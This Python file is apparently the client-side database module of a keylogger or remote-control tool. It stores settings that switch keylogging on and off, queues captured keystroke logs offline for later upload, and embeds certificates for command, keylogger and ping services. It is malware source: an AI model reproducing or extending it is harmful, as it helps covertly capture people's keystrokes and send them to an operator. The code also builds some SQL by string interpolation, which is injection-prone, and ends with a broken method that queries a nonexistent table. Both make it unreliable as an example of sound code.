import base64
import sqlite3
import os.path
import time
from datetime import datetime


class Database:
    database_name = "client_database.db"
    config_table = "config_file"
    connected = False
    cursor = None
    connection = None

    def __init__(self):
        return

    def connect_db(self):
        if not self.connected:
            self.connection = sqlite3.connect(self.database_name, check_same_thread=False)
            self.connection.cursor()
            self.connected = True

    def disconnect_db(self):
        if self.connection:
            self.connection.cursor().close()
            self.connected = False

    def init_database(self):
        self.connect_db()
        try:
            self.connection.cursor().execute(f"""
                SELECT COUNT(sID) FROM {self.config_table}
                """).fetchone()

        except sqlite3.OperationalError:
            # Creates client_info if it does not exist
            self.connection.cursor().execute(f"""
                CREATE TABLE "config_file" (
                    "sID"	TEXT NOT NULL UNIQUE,
                    "keylogger_enabled"	bit NOT NULL,
                    "data_server_enabled"	bit NOT NULL,
                    PRIMARY KEY("sID")
                );
            """)

        try:
            self.connection.cursor().execute(f"""
                SELECT COUNT(date_logged) FROM offline_data
                """).fetchone()

        except sqlite3.OperationalError:
            # Creates offline data if it does not exist
            self.connection.cursor().execute(F"""
                CREATE TABLE "offline_data" (
                    "type"	TEXT NOT NULL,
                    "data"	TEXT NOT NULL,
                    "public_key"	BLOB,
                    "date_logged"	DATETIME,
                    PRIMARY KEY("date_logged")
                );
            """)

            try:
                count = self.connection.cursor().execute(f"""
                    SELECT COUNT(server_certificates) FROM certificates
                    """).fetchone()
                print(count)
            except sqlite3.OperationalError:
                # Creates offline data if it does not exist
                self.connection.cursor().execute(f"""
                    CREATE TABLE "certificates" (
                        "server_certificate"	BLOB,
                        "service"	TEXT,
                        PRIMARY KEY("service","server_certificate")
                    );
                """)

                self.connection.commit()

                command_cert = \
                    """\
-----BEGIN CERTIFICATE-----
MIIC0zCCAbsCAgPoMA0GCSqGSIb3DQEBCwUAMC8xCzAJBgNVBAYTAlVTMQswCQYD
VQQIDAJDQTETMBEGA1UEAwwKQUxMQ09OVFJPTDAeFw0yMzA0MTUyMTI1MDZaFw0y
NDA0MTQyMTI1MDZaMC8xCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJDQTETMBEGA1UE
AwwKQUxMQ09OVFJPTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALzi
B7fZmUVH5sSk5NZpOob6wukIA3Jxe04sGDKTJ4pMFdvaY3tZu37VSA2kPoKBQvlx
nOxV6xYGNuJdUXPxtJgAF2rxZFTMbtr29Z4mGZBLR54UdDGoPMDlQ4JxHeF7orHN
xRJOaWq+DozVmccsv1Xvl8FjawRcD2LCP7v+PCRmJdE6l6mgNLDW9FIe9DNWWd7p
uWkWjOmQp95i5MhocCeGQt/Eg2E8Db7nGNz8keRBLl+pzryQN6NzFW0pct/d9BKC
1IftywrT9nX8VMmcHrlZq+ZXYDvp7HFYnmr9A1CvH/Z5fkqMbZEaD+Ra/5Wco0kV
JiAQxysOo86bl61hnxUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAqiWz6Fq7akNq
HS379rEAj93IjvUg/zlmDmDh762OCKSgcD9uL+wyZO3fBVqSpm7OYL9AcSpTbtbe
ggGZZNz6cRwsUgWu1nYFVI7pHsLeoceQU7US3wn4j/YS8puFNAfmJ+JZ2A/4bcFj
kLMTanVpacfW2W9CPQnXF8nSUPclEHTCodJY1ecFPlAsZdWqLaf4gEkBS8kHZiYi
a9BqU8BaQaTKpPlqluPkfcstaMgqqzH5TY6ctsxRmeMlu2Hl4B5gNmqGMgMKTun7
Zhfa5jtdqYAfJ6obkoW4XTyx4lobnxtwLpFLzxm10oRBRjShyPSXugWaKwMG28pm
CFNcAQXuJw==
-----END CERTIFICATE-----

"""
                keylogger_cert = \
                    """\
-----BEGIN CERTIFICATE-----
MIIC0zCCAbsCAgPoMA0GCSqGSIb3DQEBCwUAMC8xCzAJBgNVBAYTAlVTMQswCQYD
VQQIDAJDQTETMBEGA1UEAwwKQUxMQ09OVFJPTDAeFw0yMzA0MTUyMTI1MDhaFw0y
NDA0MTQyMTI1MDhaMC8xCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJDQTETMBEGA1UE
AwwKQUxMQ09OVFJPTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJmQ
95Lp/EzNLdhtrCxwC1jsz/c5Fze5OBPAvb0OGWwtjT81zruNObg+XAvORznZv3F1
B4pKz+Y7rOipL1IPzqs1+5d1ESmqmUcR+pR/Cs2dEfCYmcwhSKhPCI2uMqaGoDsf
jXE+b7a17YBv9tvg4BovlIv0MTp0GR+IAD0fVZGwO90aw3+5ykrdzead+kEBVQq1
6H5YhlpoPYdVpnM8TPoZf2vp77yX/qveQY5qNCNP7Q3EWxL4BuqVcwlIBf8ErLm9
ReLSqOn5s/Ka93r18Y612kcbtE0SNeTRtK8ktYz5LA+CbOgU+16t6ER0fwK+OPG7
qNlP58KStLJyVcU/vBkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAa79Mgd3xv/cH
wUBCVa+Sp6YHcAulB26+OuRj9rJL38pFx0ugHQ4yq+NRmOLsX2s3oeK0hCByQ1a8
O1Yj1s1nhD2K8G20jxxkpY1Y7Anv3wQ0J+Y+lp5UUCaLr/cDpl7EELXXpu2mhaa9
Z0oTYUdzf+1XY0nWh6gCGsNRC0C9IDfZYIogpmbk6fe6qyD0OMxMw0wUoll57mjQ
AreYZ8JKrRTz56J5gnbfgTvuipfYv80L70R5fisySNDAcvsKmzTVAs2GCoznHPQg
uVGuItlh9Xx3bidsxSmbiE73fX81YSLrEyKAQF2oARazHxZrM4a+ROM13ywk6aQ8
J0Tuy+ljYQ==
-----END CERTIFICATE-----

                """
                ping_cert = \
                    """\
-----BEGIN CERTIFICATE-----
MIIC0zCCAbsCAgPoMA0GCSqGSIb3DQEBCwUAMC8xCzAJBgNVBAYTAlVTMQswCQYD
VQQIDAJDQTETMBEGA1UEAwwKQUxMQ09OVFJPTDAeFw0yMzA0MTUyMTI1MDZaFw0y
NDA0MTQyMTI1MDZaMC8xCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJDQTETMBEGA1UE
AwwKQUxMQ09OVFJPTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMVD
S/YfEbHFddT36vLtzCBYj9lC9AfEkfXc5xP+4C/QmgDQECQ5tm3v4AFuvgK7e9zR
Ge/AJEpTD8uRdB9pFDB5eHKLhp9M0DLW99Ts9Q+HcC8k5+MExED/xXjcyc3ERS2m
th0ozlY/WAb4lj3QeoNcoZy7LR9UJLmv3Iv4g48yALIpTiqp9Tk8LDLWTZeqKakM
uF3VXmXbBZc3ivVIQAHged4vWwe78fMdva2NCeHP+DK0XV5SB0Jfg+aXhBsG3uZ2
IigTee/VJVsFPTvboxvc03i/PwAcaX6V+XktxlZJUGRcZx3Bu73iRLu7psUwD7B4
mkMfb+lu4mVUjd9Yu0ECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAGelNF27gStV+
1ES0hnudYBvX+8jyLl3kRkog/E6A7rOJAQ0XOkGgAnTWbYF9c88vG1QWaSvEx32s
JTMZJzwixn/c6h4wWXkNPgmh4qO95L+v97o5htber97jFjP82veOLrQ5BJOcpmHo
IKo86OePlyo52JyFFulceGn8f4LFYO6PjPw3HiCbJGEJ2LTnNKqU0wugaoB+KkZ/
6ndvxqauo3mw2FpA/kDu4rxCYa09gCYIyJ7w4S96e/0GegU8lvdShAQd9rXpNvHT
vlzo4XHEQfYdN3G2ph8N89wBOw8D86d767pTyKrdLuvRNNK5PbcsSwOLueWJi8Ae
eEaLAjCD1A==
-----END CERTIFICATE-----

                """
                keylogger_ping_cert = \
                    """\
-----BEGIN CERTIFICATE-----
MIIC0zCCAbsCAgPoMA0GCSqGSIb3DQEBCwUAMC8xCzAJBgNVBAYTAlVTMQswCQYD
VQQIDAJDQTETMBEGA1UEAwwKQUxMQ09OVFJPTDAeFw0yMzA0MTUyMTI1MDZaFw0y
NDA0MTQyMTI1MDZaMC8xCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJDQTETMBEGA1UE
AwwKQUxMQ09OVFJPTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMVD
S/YfEbHFddT36vLtzCBYj9lC9AfEkfXc5xP+4C/QmgDQECQ5tm3v4AFuvgK7e9zR
Ge/AJEpTD8uRdB9pFDB5eHKLhp9M0DLW99Ts9Q+HcC8k5+MExED/xXjcyc3ERS2m
th0ozlY/WAb4lj3QeoNcoZy7LR9UJLmv3Iv4g48yALIpTiqp9Tk8LDLWTZeqKakM
uF3VXmXbBZc3ivVIQAHged4vWwe78fMdva2NCeHP+DK0XV5SB0Jfg+aXhBsG3uZ2
IigTee/VJVsFPTvboxvc03i/PwAcaX6V+XktxlZJUGRcZx3Bu73iRLu7psUwD7B4
mkMfb+lu4mVUjd9Yu0ECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAGelNF27gStV+
1ES0hnudYBvX+8jyLl3kRkog/E6A7rOJAQ0XOkGgAnTWbYF9c88vG1QWaSvEx32s
JTMZJzwixn/c6h4wWXkNPgmh4qO95L+v97o5htber97jFjP82veOLrQ5BJOcpmHo
IKo86OePlyo52JyFFulceGn8f4LFYO6PjPw3HiCbJGEJ2LTnNKqU0wugaoB+KkZ/
6ndvxqauo3mw2FpA/kDu4rxCYa09gCYIyJ7w4S96e/0GegU8lvdShAQd9rXpNvHT
vlzo4XHEQfYdN3G2ph8N89wBOw8D86d767pTyKrdLuvRNNK5PbcsSwOLueWJi8Ae
eEaLAjCD1A==
-----END CERTIFICATE-----

                    """

                self.connection.cursor().execute(f"""
                    INSERT INTO certificates (server_certificate, service)
                    VALUES(?, 'COMMAND')""", (command_cert,))
                self.connection.commit()

                self.connection.cursor().execute(f"""
                    INSERT INTO certificates (server_certificate, service)
                    VALUES(?, 'KEYLOGGER')""", (keylogger_cert,))
                self.connection.commit()

                self.connection.cursor().execute(f"""
                    INSERT INTO certificates (server_certificate, service)
                    VALUES(?, 'PING')""", (ping_cert,))
                self.connection.commit()

                self.connection.cursor().execute(f"""
                    INSERT INTO certificates (server_certificate, service)
                    VALUES(?, 'KPING')""", (keylogger_ping_cert,))
                self.connection.commit()

            self.disconnect_db()

    def load_server_certifcate(self, service):
        self.connect_db()
        certificate = self.connection.cursor().execute(f"""
            SELECT server_certificate 
            FROM certificates
            WHERE service = ?;
        """, (service,)).fetchone()[0]
        self.disconnect_db()
        return certificate

    def save_config_file(self, sID, config_file):

        complete = False

        while not complete:
            self.connect_db()
            try:
                count = self.connection.cursor().execute(f"""
                    SELECT COUNT(sID) FROM {self.config_table}
                    """).fetchone()[0]
                if count >= 1:  # If config file exists there exists one record and will perform update
                    self.connection.execute(f"""
                        UPDATE config_file 
                        SET keylogger_enabled = {config_file[1]}, 
                        data_server_enabled = {config_file[2]},
                        sID = '{sID}'
                    """)
                    self.connection.commit()
                    complete = True
            except Exception as Error:
                print(f'ERROR SAVING CONFIG: {Error}')
                time.sleep(2)
        self.disconnect_db()

    def load_config(self, sID):
        self.connect_db()
        config_file = self.connection.cursor().execute(f"""
            SELECT * FROM config_file;
        """).fetchone()
        if not config_file:  # If config file does not exist it creates the first record
            self.connection.cursor().execute(f"""
                INSERT INTO config_file(sID, keylogger_enabled, data_server_enabled)
                VALUES(?, 1, 1)
            """, (sID,))
            self.connection.commit()

            config_file = self.connection.cursor().execute(f"""
                 SELECT * FROM config_file;
             """).fetchone()
            self.disconnect_db()
        return config_file

    def get_keylogger_status(self):
        self.connect_db()
        status = self.connection.cursor().execute(f'''
            SELECT keylogger_enabled FROM config_file;
        ''').fetchone()
        self.disconnect_db()
        return status[0]

    def offline_data_exists(self):
        self.connect_db()
        record_count = self.connection.cursor().execute(f"""
        SELECT COUNT(date_logged) FROM offline_data;
        """).fetchone()[0]
        self.disconnect_db()
        if record_count is None:
            return 0
        else:
            return record_count

    def extract_offline_record(self):
        # Returns a record from offline data and deletes it from record
        self.connect_db()
        record = self.connection.cursor().execute("""
            SELECT * FROM offline_data
        """).fetchone()
        self.connection.execute(f"""
            DELETE FROM offline_data WHERE date_logged == '{record[3]}';
        """)
        self.connection.commit()
        self.disconnect_db()
        return record

    def write_log_offline(self, log_data):
        self.connect_db()
        current_time = datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')

        self.connection.execute("""
            INSERT INTO offline_data (type, data, date_logged)
            VALUES ('TEXT', ?, ?)
        """, (log_data,current_time))
        self.connection.commit()
        self.disconnect_db()

    def keylogger_enabled(self):
        self.connect_db()
        config = self.connection.cursor().execute("""
            SELECT key_logger_enabled FROM client_configs
        """)
        self.disconnect_db()
